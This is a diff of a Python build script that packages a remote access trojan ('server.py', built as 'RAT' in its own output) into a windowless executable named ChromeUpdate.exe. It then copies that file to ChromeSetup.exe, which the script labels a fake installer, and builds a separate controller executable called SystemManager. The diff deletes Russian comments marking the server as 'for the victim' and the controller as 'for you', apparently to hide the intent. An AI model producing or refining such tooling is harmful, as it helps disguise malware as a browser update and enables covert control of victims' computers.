@@ -19,29 +19,26 @@ def install_pyinstaller():
         return False
 
 def build_server():
-    """Собираем server.py в EXE для жертвы"""
     print("Building server (RAT) executable...")
     
     cmd = [
         'pyinstaller',
         '--onefile',
         '--noconsole', 
-        '--name', 'ChromeUpdate',  # Для жертвы
+        '--name', 'ChromeUpdate',
     ]
-    
-    # Добавляем иконку если есть
+
     if os.path.exists('icon.ico'):
         cmd.extend(['--icon', 'icon.ico'])
         print("Using icon.ico")
     
-    cmd.append('server.py')  # Собираем сервер
+    cmd.append('server.py')
     
     try:
         result = subprocess.run(cmd, capture_output=True, text=True)
         if result.returncode == 0:
             print("Server build successful: dist/ChromeUpdate.exe")
-            
-            # Создаем поддельный установщик
+
             if os.path.exists("dist/ChromeUpdate.exe"):
                 shutil.copy2("dist/ChromeUpdate.exe", "ChromeSetup.exe")
                 print("Fake installer created: ChromeSetup.exe")
@@ -55,21 +52,19 @@ def build_server():
         return False
 
 def build_controller():
-    """Собираем main.py в EXE контроллера для тебя"""
     print("Building controller executable...")
     
     cmd = [
         'pyinstaller',
         '--onefile',
-        '--name', 'SystemManager',  # Для тебя
+        '--name', 'SystemManager',
     ]
-    
-    # Добавляем иконку если есть
+
     if os.path.exists('icon.ico'):
         cmd.extend(['--icon', 'icon.ico'])
         print("Using icon.ico")
     
-    cmd.append('main.py')  # Собираем контроллер
+    cmd.append('main.py')
     
     try:
         result = subprocess.run(cmd, capture_output=True, text=True)
